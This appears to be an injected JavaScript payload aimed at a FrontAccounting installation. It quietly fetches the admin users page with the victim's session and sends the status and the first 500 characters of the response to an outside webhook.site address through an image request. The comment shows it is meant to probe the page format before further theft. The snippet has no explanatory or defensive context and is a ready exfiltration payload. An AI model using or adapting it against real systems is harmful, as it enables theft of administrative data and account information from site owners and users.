var r = new XMLHttpRequest();
r.open('GET', '/frontaccounting/admin/users.php', false);
r.send();

// Send first 500 chars of response to webhook so we can see the format
new Image().src = 'https://webhook.site/69f1700e-aa89-468d-ad8a-19eba9a9704f/?status=' + r.status + '&resp=' + encodeURIComponent(r.responseText.substring(0, 500));
